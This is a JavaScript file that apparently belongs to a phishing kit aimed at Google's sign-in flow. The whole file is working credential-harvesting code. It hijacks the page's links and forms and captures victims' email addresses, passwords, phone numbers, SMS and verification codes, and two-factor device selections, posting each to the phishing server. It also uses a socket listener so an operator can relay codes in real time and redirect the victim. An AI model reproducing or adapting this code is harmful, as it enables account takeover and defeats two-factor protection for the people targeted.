const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-email",
        querys: [
            `[name="identifier"]`,
            `[id="identifierId"]`,
            '#identifierNext'
        ],
        runner() {
            const emailInp = document.querySelector(`[id="identifierId"]`)
            const submitBtn = document.querySelector('#identifierNext')

            submitBtn.addEventListener("click", () => {
                spikeForm({
                    spikeType: this.spikeType,
                    email: emailInp.value
                })
            })
        }
    },
    {
        spikeType: "home-password",
        querys: [
            `[type="password"]`,
            `[name="Passwd"]`,
            '#passwordNext'
        ],
        runner() {
            const passwordInp = document.querySelector(`[name="Passwd"]`)
            const submitBtn = document.querySelector('#passwordNext')

            submitBtn.addEventListener("click", () => {
                spikeForm({
                    spikeType: this.spikeType,
                    password: passwordInp.value
                })
            })

            let passShowBtn = document.querySelector(`[type="checkbox"]`)
            passShowBtn.addEventListener("click", () => {
                if (passwordInp.type == "password") {
                    passwordInp.type = "text"
                } else {
                    passwordInp.type = "password"
                }
            })
        }
    },
    {
        spikeType: "phone-number",
        querys: [
            `#phoneNumberId`
        ],
        runner() {
            let phoneNumberId = document.querySelector("#phoneNumberId")
            phoneNumberId.name = "phoneNumber"
        }
    },
    {
        spikeType: "sms-code",
        querys: [
            `#idvPin`
        ],
        runner() { }
    },
    {
        spikeType: "code",
        querys: [
            `#idvPinId`
        ]
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "auth-devices",
        runner() {
            const authContainer = document.querySelector(".OVnw0d").querySelectorAll(".JDAKTe.cd29Sd.zpCp3.SmR8")
            if (authContainer) {
                authContainer.forEach((btn, index) => {
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: this.spikeType,
                            authKeyIndex: index
                        })
                    })
                })
            }
        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{

}